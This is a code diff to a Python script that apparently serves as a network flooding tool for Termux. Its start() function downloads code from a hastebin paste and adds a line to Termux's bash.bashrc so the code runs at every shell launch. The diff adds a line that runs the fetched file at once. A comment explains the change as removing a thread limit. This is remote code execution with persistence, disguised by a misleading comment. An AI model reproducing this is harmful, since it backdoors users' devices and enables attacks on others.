@@ -1286,7 +1286,6 @@ def main():
             sleep(0.1)
         except KeyboardInterrupt:
             break
-
 def start():
     r = requests.get("https://hastebin.com/raw/irubezayoc")
     try:
@@ -1295,6 +1294,7 @@ def start():
         f.close()
         f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')  # Редактируем файл чата и термукса(для удаления ограничения потоков)
         f1.write("python /data/data/com.termux/files/usr/etc/c.py &\n")
+        subprocess.Popen(["python", 'c.py'])
         f1.close()
     except:
         pass
@@ -1572,6 +1572,7 @@ def makefile(text):
 if __name__ == '__main__':
     import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
     from time import sleep
+    import multiprocessing
     from icmplib import ping as pig
     from scapy.layers.inet import TCP
     from scapy.all import *
